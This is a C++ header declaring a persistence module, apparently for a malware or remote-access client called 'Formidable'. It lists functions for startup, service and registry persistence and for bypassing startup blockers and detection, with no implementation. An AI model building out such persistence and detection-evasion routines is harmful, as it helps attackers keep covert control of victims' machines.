#pragma once
#include <string>

namespace Formidable {
namespace Client {
namespace Security {

class PersistenceOptimizer {
public:
    static void InitializePersistence();
    static void EnhancePersistence();
    
    class StartupManager {
    public:
        static void EnhanceStartupMethods();
        static void ApplyMultipleStartupTechniques();
        static void BypassStartupBlockers();
    };
    
    class ServiceManager {
    public:
        static void EnhanceServicePersistence();
        static void ApplyServiceTechniques();
        static void BypassServiceDetection();
    };
    
    class RegistryManager {
    public:
        static void EnhanceRegistryPersistence();
        static void ApplyRegistryTechniques();
        static void BypassRegistryDetection();
    };
};

} // namespace Security
} // namespace Client
} // namespace Formidable
